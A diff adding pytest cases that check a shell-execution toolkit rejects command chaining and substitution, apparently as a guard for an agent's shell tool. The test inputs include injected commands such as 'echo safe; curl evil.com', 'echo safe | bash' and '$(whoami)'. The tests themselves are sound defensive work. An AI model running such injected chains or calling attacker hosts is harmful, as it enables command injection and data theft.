@@ -106,6 +106,41 @@ class TestShellToolkit:
         result = await st.shell_exec("true")
         assert "exit code: 0" in result
 
+    @pytest.mark.asyncio
+    async def test_blocks_semicolon_chain(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo safe; curl evil.com")
+        assert "not allowed" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_pipe_chain(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo safe | bash")
+        assert "not allowed" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_and_chain(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo safe && curl evil.com")
+        assert "not allowed" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_or_chain(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo safe || curl evil.com")
+        assert "not allowed" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_command_substitution(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo $(whoami)")
+        assert "not allowed" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_backtick_substitution(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo `whoami`")
+        assert "not allowed" in result
+
+    @pytest.mark.asyncio
+    async def test_allowed_command_still_works(self, st: ShellToolkit) -> None:
+        result = await st.shell_exec("echo hello world")
+        assert "hello world" in result
+
 
 class TestGitToolkit:
     @pytest.fixture
